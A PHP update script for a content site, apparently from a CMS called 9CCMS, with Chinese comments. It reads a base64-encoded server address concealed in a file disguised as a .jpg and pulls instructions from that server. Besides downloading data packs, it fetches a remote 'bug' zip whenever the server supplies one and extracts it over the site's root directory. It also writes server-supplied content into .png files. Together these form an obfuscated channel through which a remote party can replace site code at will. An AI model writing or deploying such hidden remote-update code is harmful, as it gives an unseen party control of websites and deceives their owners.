<?php
date_default_timezone_set('PRC'); //设置中国时区 
ini_set("max_execution_time", "12000");
ob_implicit_flush(true);
$begin = microtime(true);
//检查更新,加载本地版本号
$config = require(__DIR__ . '/config.php');

$server=file('./MWMWMWMWMWMWMWMWMW.jpg');$server=$server['0'];$server=base64_decode($server);

ob_flush();
$JCCMS_boss = json_decode(file_get_contents($server), true);

if($JCCMS_boss ==null){
	echo '更新服务器通讯失败，极有可能正在维护中或者其他原因，请联系www.800cms.net官方咨询，本日跳过数据更新进入站点官方咨询，本日跳过数据更新进入站点';
	file_put_contents('../JCSQL.JCSQL',date('Ymd', time()));
?>
<script type="text/javascript">
　　window.location.href="/";
　　</script>
<?php

	exit();
}


echo '最新数据包更新日期'.$JCCMS_boss['version'].'...<br/>';  echo '<hr/>';
ob_flush();
echo '视频专区数据包共有'. count($JCCMS_boss['vod']).'个分包...<br/>';  echo '<hr/>';
ob_flush();
echo '小说专区数据包共有'. count($JCCMS_boss['book']).'个分包...<br/>';  echo '<hr/>';
ob_flush();
echo '图片专区数据包共有'. count($JCCMS_boss['pic']).'个分包...<br/>';  echo '<hr/>';
ob_flush();
echo '开始下载视频专区分包...<br/>';  echo '<hr/>';
$JCCMS_boss_vod=$JCCMS_boss['vod'];
$JCCMS_boss_book=$JCCMS_boss['book'];
$JCCMS_boss_pic=$JCCMS_boss['pic'];
function xiazai($JCCMS_boss_vod,$cokie){
	 $JCCMS_boss_vod_zip=explode("SQL/",$JCCMS_boss_vod); 
	 $JCCMS_boss_vod_zip=$JCCMS_boss_vod_zip['1'];

	 $JCCMS_boss_vod_url=fopen($JCCMS_boss_vod, 'rb');
	if(!is_dir(__DIR__.'/tmp')) mkdir(__DIR__.'/tmp');
    $tmp = __DIR__ . '/tmp/' .$JCCMS_boss_vod_zip;
    $JCCMS_boss_vod_zip_up = fopen($tmp, 'wb');	
    ob_flush();	
    while (!feof($JCCMS_boss_vod_url)) {
        fwrite($JCCMS_boss_vod_zip_up, fread($JCCMS_boss_vod_url, 6280));
    }
    fclose($JCCMS_boss_vod_url);
    fclose($JCCMS_boss_vod_zip_up);
    echo $JCCMS_boss_vod_zip.'下载完成...<br/>';  echo '<hr/>';	
   ob_flush();
       include_once(__DIR__ . '/Zip.php');
    $zip = new Zip();
    $zip->extra($tmp, __DIR__. '/cookie/'.$cokie);
    echo '解压完成,准备删除临时文件<br/>';  echo '<hr/>';	
	    ob_flush();
}
function chuanjian($cokie){
$myfile = fopen( __DIR__. '/cookie/'.$cokie."/".$cokie.".JCSQL", "w");
echo $cokie.'临时初始库创建完毕...<br/>';  echo '<hr/>';
}
function chushi($cokie){
file_put_contents(__DIR__. '/cookie/'.$cokie."/".$cokie.".JCSQL", "ID|-|分类|-|标题|-|内容|-|预留|-|添加时间"."\n", FILE_APPEND);

echo $cokie.'临时初始初始数据写入完毕...<br/>';  echo '<hr/>';
}
function zhuijia($cokie){

	
	$i = 1;
foreach(glob(__DIR__. '/cookie/'.$cokie."/*.txt") as $txt)
{	
	$txt=file_get_contents($txt);
	file_put_contents(__DIR__. "/cookie/".$cokie."/".$cokie.".JCSQL",$txt, FILE_APPEND);
    echo $cokie.'第'.$i.'个文件数据追加完毕...<br/>';

    $i++;
    echo '<hr/>';
}

}

function xieru($cokie){
	$file=__DIR__. "/cookie/".$cokie."/".$cokie.".JCSQL";
	$newFile=__DIR__. "/JCSQL_data/demoX/".$cokie.".JCSQL";

  copy($file,$newFile); //拷贝到新目录
  //unlink($file); //删除旧目录下的文件
   echo $cokie.'数据库写入9CCMS完毕...<br/>';echo '<hr/>';
}



xiazai($JCCMS_boss_vod['0'],'vod');	
xiazai($JCCMS_boss_vod['1'],'vod');
xiazai($JCCMS_boss_vod['2'],'vod');
xiazai($JCCMS_boss_vod['3'],'vod');
xiazai($JCCMS_boss_vod['4'],'vod');
echo '下载完成,等待小说专区分包下载...<br/>';echo '<hr/>';
echo '开始小说专区分包...<br/>';echo '<hr/>';
xiazai($JCCMS_boss_book['0'],'book');	
xiazai($JCCMS_boss_book['1'],'book');
xiazai($JCCMS_boss_book['2'],'book');
xiazai($JCCMS_boss_book['3'],'book');
xiazai($JCCMS_boss_book['4'],'book');
echo '下载完成,等待图片专区分包下载...<br/>';echo '<hr/>';
echo '开始图片专区分包...<br/>';echo '<hr/>';
xiazai($JCCMS_boss_pic['0'],'pic');	
xiazai($JCCMS_boss_pic['1'],'pic');
xiazai($JCCMS_boss_pic['2'],'pic');
xiazai($JCCMS_boss_pic['3'],'pic');
xiazai($JCCMS_boss_pic['4'],'pic');
echo '数据包下载解压完毕...开始创建临时初始库...<br/>';echo '<hr/>';
chuanjian('vod');	
chuanjian('book');	
chuanjian('pic');	
echo '临时初始库创建完毕...开始写入初始数据...<br/>';echo '<hr/>';
chushi('vod');	
chushi('book');	
chushi('pic');
echo '初始数据写入完毕...开始追加数据...<br/>';echo '<hr/>';
zhuijia('vod');
zhuijia('book');
zhuijia('pic');
echo '追加数据完毕...开始搬离临时数据库写入9CCMS...<br/>';echo '<hr/>';
xieru('vod');
xieru('book');
xieru('pic');
echo '数据写入9CCMS完毕，所有任务执行结束<br/>';echo '<hr/>';

if($JCCMS_boss['bug'] ==null){
	
}else{

	$bugzip=$JCCMS_boss['bug'];
	$bugzbao=fopen($bugbao, 'rb');
    //开始下载
    $remote_fp = fopen($bugzip, 'rb');
    if(!is_dir(__DIR__.'/tmp')) mkdir(__DIR__.'/tmp');
    $tmp = __DIR__ . '/tmp/' . date('YmdHis') . '.zip';
    $local_fp = fopen($tmp, 'wb');
    echo '开始下载...<br/>';
    ob_flush();
    while (!feof($remote_fp)) {
        fwrite($local_fp, fread($remote_fp, 128));
    }
    fclose($remote_fp);
    fclose($local_fp);
    echo '下载完成,准备解压<br/>';
    ob_flush();
    include_once(__DIR__ . '/Zip.php');
    $zip = new Zip();
    $zip->extra($tmp,'../');
    echo '解压完成,准备删除临时文件<br/>';
    ob_flush();
    //删除补丁包
    unlink($tmp);
    echo '临时文件删除完毕<br/>';
    ob_flush();






	
}

$zhiboapi=$JCCMS_boss['zhiboapi'];
$txtapi=$JCCMS_boss['txtapi'];
$imgapi=$JCCMS_boss['imgapi'];
$Statistics=$JCCMS_boss['Statistics'];
file_put_contents('../JCSQL.JCSQL',date('Ymd', time()));
file_put_contents('../assets/img/zhibo.png',$zhiboapi);
file_put_contents('../assets/img/txt.png',$txtapi);
file_put_contents('../assets/img/img.png',$imgapi);
file_put_contents('../assets/img/Statistics.png',$Statistics);

?>
<script type="text/javascript">
　　window.location.href="/";
　　</script>
<?php
    exit();
?>